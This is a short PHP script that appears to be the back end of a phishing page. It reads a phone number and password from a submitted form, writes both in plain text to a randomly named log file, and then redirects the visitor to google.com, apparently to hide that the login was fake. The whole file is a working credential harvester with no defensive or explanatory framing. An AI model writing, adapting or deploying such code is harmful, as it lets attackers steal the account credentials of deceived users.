   

<?php
// Generate a unique filename using a combination of timestamp and random string
$filename = 'user_data_' . time() . '_' . bin2hex(random_bytes(5)) . '.txt';

// Open the file for writing
$file = fopen($filename, 'w');

// Get the phone number and password from the form submission
$phone = $_POST['phone'];
$password = $_POST['password'];

// Write the phone number and password to the file
fwrite($file, "|====Phone Number: " . $phone . "||=========||");
fwrite($file, "Password: " . $password."====|");

// Close the file
fclose($file);

// You can redirect to a success page or display a message to the user
   header("Location: https://google.com");
?>